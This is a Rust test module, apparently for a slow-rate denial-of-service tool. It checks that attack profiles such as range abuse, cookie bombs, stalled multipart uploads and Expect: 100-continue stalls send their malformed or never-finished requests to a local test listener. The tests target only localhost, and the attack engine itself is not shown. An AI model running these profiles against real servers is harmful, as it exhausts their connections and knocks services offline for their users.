        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_millis(1500);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(n) => buf.extend_from_slice(&tmp[..n]),
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("range-abuse");
        let mut rng = Rng::new(5);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(20));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let _completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        assert!(text.starts_with("GET /"), "missing request line: {text}");
        // Count how many times "Range:" appears (each request has a Range header)
        let range_count = text.matches("Range:").count();
        assert!(
            range_count > 1,
            "expected multiple Range headers, got {range_count}"
        );
        // Verify Range header format
        assert!(
            text.contains("Range: bytes="),
            "Range header format incorrect"
        );
    }

    #[test]
    fn cookie_bomb_sends_large_cookie() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_millis(1500);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(n) => buf.extend_from_slice(&tmp[..n]),
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("cookie-bomb");
        let mut rng = Rng::new(6);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(20));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let _completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        assert!(text.starts_with("GET /"), "missing request line: {text}");
        // Verify Cookie header exists and is large
        assert!(text.contains("Cookie:"), "Cookie header missing");
        // Verify bomb_cookie name
        assert!(text.contains("bomb_cookie="), "Cookie name incorrect");
    }

    #[test]
    fn jsonrpc_slow_sends_json_content() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_millis(1500);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(n) => buf.extend_from_slice(&tmp[..n]),
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("jsonrpc-slow");
        let mut rng = Rng::new(7);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(20));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let _completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        assert!(text.starts_with("POST /"), "missing request line: {text}");
        // Verify JSON content type and payload
        assert!(
            text.contains("Content-Type: application/json"),
            "JSON content type missing"
        );
        assert!(
            text.contains(r#""jsonrpc":"2.0""#),
            "JSON-RPC version missing"
        );
        // Just check that JSON-RPC structure started (may be partial due to slow drip)
        assert!(
            text.contains(r#"{"jsonrpc""#) || text.contains(r#""method""#),
            "JSON-RPC structure missing"
        );
    }

    #[test]
    fn smtp_slow_envelope_sends_smtp_commands() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_millis(1500);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(n) => buf.extend_from_slice(&tmp[..n]),
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("smtp-slow-envelope");
        let mut rng = Rng::new(8);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(20));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let _completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        // Verify SMTP commands were sent
        assert!(text.contains("EHLO"), "EHLO command missing");
        assert!(text.contains("MAIL FROM:"), "MAIL FROM command missing");
        assert!(text.contains("RCPT TO:"), "RCPT TO command missing");
    }

    #[test]
    fn ftp_slow_command_sends_ftp_commands() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_millis(1500);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(n) => buf.extend_from_slice(&tmp[..n]),
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("ftp-slow-command");
        let mut rng = Rng::new(9);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(20));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let _completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        // Verify FTP commands were sent
        assert!(text.contains("USER"), "USER command missing");
        assert!(text.contains("PASS"), "PASS command missing");
        assert!(text.contains("PASV"), "PASV command missing");
    }

    #[test]
    fn multipart_slow_upload_sends_multipart_preamble() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        listener.set_nonblocking(true).ok();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            // Accept loop mirrors engine_opens_and_holds_connections: a raw
            // accepted socket keeps reading until the client goes away or
            // the deadline passes, so no observed write can be lost.
            let mut sock_opt: Option<TcpStream> = None;
            let deadline = std::time::Instant::now() + Duration::from_secs(8);
            while sock_opt.is_none() && std::time::Instant::now() < deadline {
                match listener.accept() {
                    Ok((sock, _)) => sock_opt = Some(sock),
                    Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
                        std::thread::sleep(Duration::from_millis(5));
                    }
                    Err(_) => break,
                }
            }
            let mut sock = match sock_opt {
                Some(sock) => sock,
                None => return Vec::new(),
            };
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_secs(8);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(0) => break, // client went away
                    Ok(n) => {
                        buf.extend_from_slice(&tmp[..n]);
                        if buf.len() >= 2048 {
                            break;
                        }
                    }
                    Err(ref err)
                        if err.kind() == io::ErrorKind::WouldBlock
                            || err.kind() == io::ErrorKind::TimedOut =>
                    {
                        continue;
                    }
                    Err(_) => break,
                }
            }
            buf
        });

        let mut cfg = config("multipart-slow-upload");
        // A fat byte budget keeps the profile in its endless dribble phase
        // (never blocked on `Content-Length` accounting) while the killer
        // thread's 400ms window caps how many dribble bytes arrive.
        cfg.base_post_length = 65536;
        // Zero dribble delay: the ~10 line-by-line header writes must all
        // land inside the window the killer thread leaves open. Generous
        // socket timeouts defeat the OS-level write stall entirely.
        cfg.delay_min = 0.0;
        cfg.delay_max = 0.0;
        cfg.connect_timeout = 5.0;
        let mut rng = Rng::new(10);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(400));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let _ = stream.set_read_timeout(Some(Duration::from_secs(5)));
        let _ = stream.set_write_timeout(Some(Duration::from_secs(5)));
        let _completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        // The killer lets the dribble loop run long after the headers are
        // out, so drained assertions must only cover the header section:
        // bound the checks to the completed request head. (The collector
        // cap of 2048 bytes keeps a bounded tail of dribble bytes around.)
        // Header names are case-insensitive on the wire (RFC 9110 §5.1), so
        // match the multipart marker case-insensitively: the only
        // guaranteed-complete structure is the bytes up to the FIRST header
        // terminator, and the collector cap (~2 KB) means later bytes may be
        // truncated mid-dribble, so slice there before asserting.
        let head_end = text.find("\r\n\r\n").expect("header terminator") + 4;
        let head = text[..head_end].to_ascii_lowercase();
        assert!(head.starts_with("post /"), "missing request line: {text}");
        assert!(
            head.contains("content-type: multipart/form-data; boundary="),
            "multipart content type missing"
        );
        // The upload preamble follows the header terminator; require it, then
        // prove the run never emitted a closing boundary for the boundary it
        // actually advertised. The closing delimiter is the MIME framing
        // (`--` + token + `--`); compare against the lowercased capture so
        // the (legal) header-name casing can never hide a real terminator.
        let after_head = text[head_end..].to_ascii_lowercase();
        assert!(
            after_head.contains("content-disposition: form-data; name=\"upload\""),
            "upload part preamble missing"
        );
        let boundary = head
            .split("boundary=")
            .nth(1)
            .expect("boundary")
            .split("\r\n")
            .next()
            .unwrap_or("");
        assert!(
            boundary.len() > "----webkitformboundary".len(),
            "boundary token missing"
        );
        let closer = format!("--{boundary}--");
        assert!(
            !text.to_ascii_lowercase().contains(&closer),
            "closing boundary must never be emitted"
        );
    }

    #[test]
    fn expect_continue_abuse_announces_body_and_stalls() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        listener.set_nonblocking(true).ok();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            // Accept loop mirrors engine_opens_and_holds_connections, then
            // keep READING (never reply, never close early): the collector
            // plays a patient server that holds the socket open while the
            // client stalls its announced body.
            let mut sock_opt: Option<TcpStream> = None;
            let accept_deadline = std::time::Instant::now() + Duration::from_secs(8);
            while sock_opt.is_none() && std::time::Instant::now() < accept_deadline {
                match listener.accept() {
                    Ok((sock, _)) => sock_opt = Some(sock),
                    Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
                        std::thread::sleep(Duration::from_millis(5));
                    }
                    Err(_) => break,
                }
            }
            let mut sock = match sock_opt {
                Some(sock) => sock,
                None => return Vec::new(),
            };
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_secs(8);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(0) => break, // client went away
                    Ok(n) => {
                        buf.extend_from_slice(&tmp[..n]);
                        if buf.len() >= 1400 {
                            break;
                        }
                    }
                    Err(ref err)
                        if err.kind() == io::ErrorKind::WouldBlock
                            || err.kind() == io::ErrorKind::TimedOut =>
                    {
                        continue;
                    }
                    Err(_) => break,
                }
            }
            buf
        });

        let mut cfg = config("expect-continue-abuse");
        cfg.base_post_length = 65536;
        // A zero delay plus a fat byte budget keeps the stall dribbling for
        // the whole killer window; the interim read deadline is exercised by
        // the silent collector above.
        cfg.delay_min = 0.0;
        cfg.delay_max = 0.0;
        cfg.connect_timeout = 5.0;
        let mut rng = Rng::new(11);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(400));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let _ = stream.set_read_timeout(Some(Duration::from_secs(5)));
        let _ = stream.set_write_timeout(Some(Duration::from_secs(5)));
        let _completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        // The killer lets the run dribble for its whole 400ms window, and
        // the interim read on a silent server blocks for the full
        // connect_timeout. Assert against what the profile provably did —
        // announce the body and stall it — rather than a byte count that
        // depends on how the two racing clocks interleave.
        assert!(text.starts_with("POST /"), "missing request line: {text}");
        assert!(
            text.contains("Expect: 100-continue"),
            "Expect header missing"
        );
        assert!(
            text.contains("Content-Length:"),
            "announced body length missing"
        );
        let header_end = text.find("\r\n\r\n").expect("header terminator") + 4;
        assert!(
            stats.bytes_sent() as usize >= header_end,
            "client must have written at least the announced headers"
        );
    }
}
